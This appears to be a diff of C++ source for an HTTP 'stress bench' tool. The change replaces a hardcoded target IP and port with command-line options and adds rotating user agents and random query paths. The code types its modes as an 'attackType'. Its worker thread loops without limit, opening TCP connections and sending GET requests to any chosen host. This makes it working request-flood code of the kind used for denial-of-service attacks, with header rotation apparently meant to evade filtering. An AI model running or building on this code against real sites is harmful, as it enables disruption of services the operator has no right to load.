@@ -20,14 +20,25 @@
 
 using namespace std;
 
-/* Global sock address in*/
-struct sockaddr_in serv_addr;
-struct hostent *server;
+sockaddr_in serverAddr;
 
-/* Configuration */
-char remoteHost[] = "139.162.25.101";
-ushort remotePort = 3003;
+typedef enum {
+  STRESS_BENCH_COMMON = 0
+} attackType;
+
+attackType attackVector = STRESS_BENCH_COMMON;
+
+//User-Agent
+string userAgentFile;
+vector<string> userAgents;
+
+//Queries
+string queriesFile;
 vector<string> queries;
+
+//Remote socket
+string hostName;
+ushort port = 80;
 
 /* Terminator */
 bool terminated = false;
@@ -38,73 +49,92 @@ int counter = 0;
 
 /* Common bench */
 void *commonBenchW(void *dataPtr);
-void commonBench();
 
-/* */
+/* Undefined bench */
 void *undefineBenchW(void *dataPtr);
-void undefinedBench();
 
-void eventHandler(int signal)
-{
-  //Wait for it
-  cout << "\nDude we are falling...\n";
-  terminated = true;
-}
+void eventHandler(int signal);
+
+void getAddrByName(char *remoteHost, ushort remotePort, sockaddr_in *addrServer);
+void getAddrByName(const char *remoteHost, ushort remotePort, sockaddr_in *addrServer);
+
+#define checkParam(param) if (string(argv[c]).compare(param) == 0 && c + 1 < argc)
+#define checkValue(value) if (string(argv[c]).compare(value) == 0)
 
 /* Just common thing */
 int main(int argc, char *argv[])
 {
-  randomize test;
-
-  httpRequest hr;
-  hr.push("Host", "fkguru.com");
-  hr.push("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0");
-  hr.push("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-  hr.push("Accept-Language", "en-US,en;q=0.5");
-  hr.push("Accept-Encoding", "gzip, deflate, br");
-  hr.push("Connection", "keep-alive");
-  hr.body = "helloo";
-  //hr.eraseField("Connection");
-  hr.eraseValue("fkguru");
-  cout << hr.get() << "\n";
-
-  vector<string> data;
-  data = readFile("README.md");
-  for(size_t i = 0; i < data.size(); i++){
-    cout << data[i] << "\n";
-  }
-  return 0;
-  cout << test.getRandomPath(50, 200) << endl;
-  cout << test.getRandomCookie(200, 500) << endl;
-  cout << test.getRandomNumber(1, 255) << endl;
-  cout << test.getRandomParam(10, 20) << endl;
-  cout << test.getRandomValue(15, 50) << endl;
-  return 0;
-  string curLine;
-  ifstream fileRead;
-
-  //Dream catcher, Ahihi
-  signal(SIGINT, eventHandler);
-
-  //Resolve host name
-  server = gethostbyname(remoteHost);
-  memset(&serv_addr, 0x0, sizeof(serv_addr));
-  serv_addr.sin_family = AF_INET;
-  memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
-  serv_addr.sin_port = htons(remotePort);
-
-  //Read queries
-  fileRead.open("queries.txt", ios::in | ios::app);
-  if (fileRead.is_open())
+  threadPool myThread;
+  for (int c = 0; c < argc; c++)
   {
-    while (getline(fileRead, curLine))
+    //Host param
+    checkParam("--host")
     {
-      queries.push_back(curLine);
+      hostName = argv[++c];
     }
-    fileRead.close();
+
+    //Port param
+    checkParam("--port")
+    {
+      port = stoi(string(argv[++c]));
+    }
+
+    //User agent file
+    checkParam("--user-agent")
+    {
+      userAgentFile = argv[++c];
+      if (userAgentFile.length() > 0)
+      {
+        userAgents = readFile(userAgentFile);
+      }
+    }
+
+    //Queries files
+    checkParam("--queries")
+    {
+      queriesFile = argv[++c];
+      if (queriesFile.length() > 0)
+      {
+        queries = readFile(queriesFile);
+      }
+    }
+
+    //Get attack vector
+    checkParam("--type")
+    {
+      c++;
+      checkValue("common")
+      {
+        attackVector = STRESS_BENCH_COMMON;
+      }
+    }
   }
-  commonBench();
-  //The death coming
+
+  if (hostName.empty())
+  {
+    cout << "Invalid host name\n";
+    return -1;
+  }
+  if (port <= 0)
+  {
+    cout << "Invalid port\n";
+    return -1;
+  }
+
+  getAddrByName(hostName.c_str(), port, &serverAddr);
+
+  switch (attackVector)
+  {
+  case STRESS_BENCH_COMMON:
+  default:
+
+    break;
+  }
+
+  //Catch Ctrl+C
+  signal(SIGINT, eventHandler);
+  myThread.create(commonBenchW);
+  myThread.join();
   while (!terminated)
   {
     usleep(1000000);
@@ -116,92 +146,61 @@ void *
 commonBenchW(void *dataPtr)
 {
   tcpClient myClient;
-  unsigned int startTime, endTime;
-  srand(nanoTime());
-  string data = "GET ";
-  char buffer[1024];
-  while (!terminated)
-  {
-    data += queries[rand() % queries.size()];
-    data += " HTTP/1.1\n";
-    data += "Host: ";
-    data += remoteHost;
-    data += "\n\n";
-    startTime = nanoTime();
-    //----------------------
-    myClient.open();
-    myClient.connect(serv_addr);
-    myClient.send((void *)data.c_str(), (size_t)data.length());
-    myClient.recv(buffer, 1023);
-    buffer[1023] = 0x0;
-    //cout << data << "\n";
-    //cout << buffer << "\n";
-    myClient.close();
-    //----------------------
-
-    endTime = nanoTime();
-    pthread_mutex_lock(&mutex1);
-    cout << (double)(endTime - startTime) / 1000000 << endl;
-    counter++;
-    pthread_mutex_unlock(&mutex1);
-    usleep(100000);
-  }
-  cout << "Terminated...\n";
-}
-
-void commonBench()
-{
-  //Create multiply thread
-  threadPool myThread;
-  myThread.create(commonBenchW);
-  myThread.join();
-}
-
-void *
-undefinedBenchW(void *dataPtr)
-{
-  tcpClient myClient;
-  unsigned int startTime, endTime;
   randomize rndSrc;
   srand(nanoTime());
-  string data = "GET ";
+  httpRequest request;
+  
+  request.push("Host", hostName);
+  request.push("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0");
+  request.push("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+  request.push("Accept-Language", "en-US,en;q=0.5");
+  request.push("Accept-Encoding", "deflate, br");
+  request.push("Connection", "keep-alive");
   char buffer[1024];
+  if (queries.size() > 0)
+  {
+    request.uri = queries[rand() % queries.size()];
+  }
+  if (userAgents.size() > 0)
+  {
+    request.eraseField("User-Agent");
+    request.push("User-Agent", userAgents[rand() % userAgents.size()]);
+  }
+
+  string data = request.get();
   while (!terminated)
   {
-    data += rndSrc.getRandomPath(50, 100);
-    data += " HTTP/1.1\n";
-    data += "Host: ";
-    data += remoteHost;
-    data += "\n";
-    data += "Cookie: ";
-    data += rndSrc.getRandomCookie(200, 500);
-    data += "\n\n";
-    startTime = nanoTime();
-    //----------------------
+
     myClient.open();
-    myClient.connect(serv_addr);
+    myClient.connect(serverAddr);
+
     myClient.send((void *)data.c_str(), (size_t)data.length());
     myClient.recv(buffer, 1023);
     buffer[1023] = 0x0;
-    //cout << data << "\n";
-    //cout << buffer << "\n";
     myClient.close();
-    //----------------------
-
-    endTime = nanoTime();
-    pthread_mutex_lock(&mutex1);
-    cout << (double)(endTime - startTime) / 1000000 << endl;
-    counter++;
-    pthread_mutex_unlock(&mutex1);
-    usleep(100000);
   }
   cout << "Terminated...\n";
 }
 
-void undefinedBench()
+void getAddrByName(const char *remoteHost, ushort remotePort, sockaddr_in *addrServer)
 {
-  //Create multiply thread
-  threadPool myThread;
-  myThread.create(undefinedBenchW);
-  myThread.join();
+  getAddrByName((char *)remoteHost, remotePort, addrServer);
+}
+
+void getAddrByName(char *remoteHost, ushort remotePort, sockaddr_in *addrServer)
+{
+  hostName = remoteHost;
+  struct hostent *server;
+  server = gethostbyname(remoteHost);
+  memset(addrServer, 0x0, sizeof(sockaddr_in));
+  addrServer->sin_family = AF_INET;
+  memcpy(&addrServer->sin_addr.s_addr, server->h_addr, server->h_length);
+  addrServer->sin_port = htons(remotePort);
+}
+
+void eventHandler(int signal)
+{
+  //Wait for it
+  cout << "\nDude we are falling...\n";
+  terminated = true;
 }
